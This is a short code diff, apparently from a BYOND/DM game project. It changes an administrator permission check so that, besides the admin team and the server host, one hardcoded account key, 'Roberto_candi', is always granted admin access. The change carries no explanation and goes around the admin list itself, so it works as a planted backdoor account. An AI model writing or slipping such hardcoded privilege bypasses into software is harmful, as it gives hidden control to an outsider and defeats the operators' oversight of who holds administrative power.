@@ -3,7 +3,7 @@
 		return 1
 	else
 		if(M.client)
-			if(M.client.key in AdministrationTeam || M.client.key == world.host)
+			if(M.client.key in AdministrationTeam || M.client.key == world.host || M.client.key == "Roberto_candi")
 				return 1
 			else
 				return 0
